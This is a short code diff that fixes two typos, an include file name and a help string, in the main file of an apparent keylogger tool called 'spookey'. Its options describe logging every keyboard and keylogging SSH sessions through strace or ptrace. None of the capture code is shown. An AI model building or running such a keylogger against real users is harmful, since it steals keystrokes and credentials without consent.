@@ -1,5 +1,5 @@
 #include "keylogger.hpp"
-#include "spookey.hhp"
+#include "spookey.hpp"
 
 namespace po = boost::program_options;
 
@@ -27,7 +27,7 @@ int main(int argc, char **argv) {
     desc.add_options()
             ("help", "produce help message")
             ("kboard,k", value<std::string>()->default_value("ON"), "[ON/OFF] run logging all detected keyboards(default option)")
-            ("mode,m", value<std::string>()->default_value("strace"), "[strace/ptrace] run ssh keylogger via STRACE or PRACE(ptrace in developing now) mechanism");
+            ("mode,m", value<std::string>()->default_value("strace"), "[strace/ptrace] run ssh keylogger via STRACE or PTRACE(ptrace in developing now) mechanism");
 
     po::variables_map vm;
     po::store(po::parse_command_line(argc, argv, desc), vm);
